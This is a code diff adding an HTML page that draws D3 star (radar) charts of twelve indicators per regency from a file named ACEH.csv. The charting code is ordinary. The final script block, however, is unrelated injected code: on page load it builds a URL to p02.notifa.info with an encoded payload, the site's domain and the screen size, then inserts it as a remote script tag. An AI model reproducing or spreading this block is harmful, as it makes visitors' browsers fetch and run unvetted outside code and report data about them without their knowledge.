@@ -1,0 +1,232 @@
+<!DOCTYPE>
+<meta charset="utf-8">
+<style>
+    #target {
+        margin: 40px 0px;
+    }
+
+    .wrapper {
+        position: relative;
+        display: inline-block;
+    }
+
+    .chart {
+        margin-top: 10px;
+        margin-bottom: 10px;
+        margin-right: auto;
+        margin-left: auto;
+        padding-bottom: 10px;
+        padding-top: -20;
+        padding-left: 20;
+    }
+
+    .star-title {
+        font-size: 16px;
+        font-weight: bolder;
+    }
+
+    .star-label {
+        font-size: 11px;
+        pointer-events: none;
+    }
+
+    .star-origin {
+        fill: #333;
+    }
+
+    .star-axis {
+        stroke: #ccc;
+        stroke-width: 2px;
+        stroke-dasharray: 4 5;
+    }
+
+    .star-path {
+        stroke: #444;
+        stroke-width: 2px;
+        fill: #709CB1;
+        fill-opacity: 0.6;
+    }
+
+    .star-interaction {
+        opacity: 0;
+    }
+
+    .interaction {
+        pointer-events: none;
+    }
+
+    .interaction.label {
+        position: absolute;
+        font-size: 11px;
+        text-shadow: 0 1px 0 #FFF, 0 -1px 0 #FFF, 1px 0 #FFF, -1px 0 #FFF;
+    }
+
+    .interaction.circle {
+        fill: #444;
+        fill-opacity: 0.6;
+        stroke: #444;
+    }
+
+    ::-webkit-scrollbar {
+        display: none;
+    }
+</style>
+
+<body>
+    <script src="https://d3js.org/d3.v3.min.js"></script>
+    <script src="https://code.jquery.com/jquery-1.11.0.min.js"></script>
+    <script src="d3-starPlot.js"></script>
+    <script>
+        var margin = {
+            top: 32,
+            right: -5,
+            bottom: 10,
+            left: 40
+        };
+        var width = 290 - margin.left - margin.right;
+        var height = 240 - margin.top - margin.bottom;
+        var labelMargin = -20;
+
+        var scale = d3.scale.linear()
+            .domain([0, 100.000])
+            .range([0, 100])
+
+        d3.csv('ACEH.csv')
+            .row(function (d) {
+                d.VPDDKN = +d.VPDDKN;
+                d.VKSHTN = +d.VKSHTN;
+                d.VEKNM = +d.VEKNM;
+                d.VENRG = +d.VENRG;
+                d.VAIRBS = +d.VAIRBS;
+                d.VKOMIN = +d.VKOMIN;
+                d.VSARTRANS = +d.VSARTRANS;
+                d.VAKSTRANS = +d.VAKSTRANS;
+                d.VKESMAS = +d.VKESMAS;
+                d.VOR = +d.VOR;
+                d.VMNDR = +d.VMNDR;
+                d.VKSDM = +d.VKSDM;
+                return d;
+            })
+            .get(function (error, rows) {
+                var star = d3.starPlot()
+                    .width(width)
+                    .properties([
+                        'VPDDKN',
+                        'VKSHTN',
+                        'VEKNM',
+                        'VENRG',
+                        'VAIRBS',
+                        'VKOMIN',
+                        'VSARTRANS',
+                        'VAKSTRANS',
+                        'VKESMAS',
+                        'VOR',
+                        'VMNDR',
+                        'VKSDM'
+                    ])
+                    .scales(scale)
+                    .labels([
+                        'VPDDKN',
+                        'VKSHTN',
+                        'VEKNM',
+                        'VENRG',
+                        'VAIRBS',
+                        'VKOMIN',
+                        'VSARTRANS',
+                        'VAKSTRANS',
+                        'VKESMAS',
+                        'VOR',
+                        'VMNDR',
+                        'VKSDM'
+                    ])
+                    .title(function (d) {
+                        return d.KAB;
+                    })
+                    .margin(margin)
+                    .labelMargin(labelMargin)
+
+                rows.forEach(function (d, i) {
+                    star.includeLabels(i % 4 === 0 ? true : false);
+
+                    var wrapper = d3.select('#target').append('div')
+                        .attr('class', 'wrapper')
+
+                    var svg = wrapper.append('svg')
+                        .attr('class', 'chart')
+                        .attr('width', width + margin.left + margin.right)
+                        .attr('height', width + margin.top + margin.bottom)
+
+                    var starG = svg.append('g')
+                        .datum(d)
+                        .call(star)
+                        .call(star.interaction)
+
+                    var interactionLabel = wrapper.append('div')
+                        .attr('class', 'interaction label')
+
+                    var circle = svg.append('circle')
+                        .attr('class', 'interaction circle')
+                        .attr('r', 4)
+
+                    var interaction = wrapper.selectAll('.interaction')
+                        .style('display', 'none');
+
+                    svg.selectAll('.star-interaction')
+                        .on('mouseover', function (d) {
+                            svg.selectAll('.star-label')
+                                .style('display', 'none')
+
+                            interaction
+                                .style('display', 'block')
+
+                            circle
+                                .attr('cx', d.x)
+                                .attr('cy', d.y)
+
+                            $interactionLabel = $(interactionLabel.node());
+                            interactionLabel
+                                .text(d.key + ': ' + d.datum[d.key])
+                                .style('left', d.xExtent - ($interactionLabel.width() / 2))
+                                .style('top', d.yExtent - ($interactionLabel.height() / 2))
+                        })
+                        .on('mouseout', function (d) {
+                            interaction
+                                .style('display', 'none')
+
+                            svg.selectAll('.star-label')
+                                .style('display', 'block')
+                        })
+                });
+            });
+    </script>
+    <div id='target'></div>
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function () {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
+                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXG8VMvoXmNCN51YNvihjvUuPTf6Yn7q8u9TrgbsrWY3DhtNuUCnAwzPAmMfATVocMfHdEnjpNqY8J%2f5wBhQ%2fOxEvLPEJuG9c1nXVwdZZ14%2bLXY8Vq04LIhdpTSWBhBOakpoBTJaLYJ%2bPrhX8rr9tWmvZxNV1sq8eb4m8XScPGWBaWktsR7jio2rOQb97jMvBQR5VGntY98c9aQRlRos2pbaqBJm%2fV0888qtu1fmlglsmOpQoCSlbUcQa4AtXwe8uDnKDMFOMrnmVSscgyPlmjJOLqNUouLh0KXyPq8lJy7l1BA5ddg3Z%2fnlbNAiIoJOcd09frlZSkc72Mo2FuC5YlNwfb%2b2PetYhwn7zQmrC0L3SpJc7%2f3rSlk0andEzsGSockplOsutAVBydEYj%2bIaNOtVpd%2fXPwHlmX%2bOLLkiNuTudxJhlqEmPQJ7T0CynD2GWFIXPzxKnWfQyI1MsbtsIqLZ5FrwWS03dOs1h425iJSuPcu3h6cTX8%2bRLWyWJKokSbA6wNxp7OzXhzRBVtE1XuJqHNkytMiEj1EM6k5ifRZtmX4FkiN%2fqYJWReBEu718LK6arjuwtMFuP5FVVEhiSTrraDVk%2fpczXnkrpHkGTV8x26ahgc6BrbnA%3d%3d" +
+                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
+                    .height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function () {});
+        };
+    </script>
+</body>
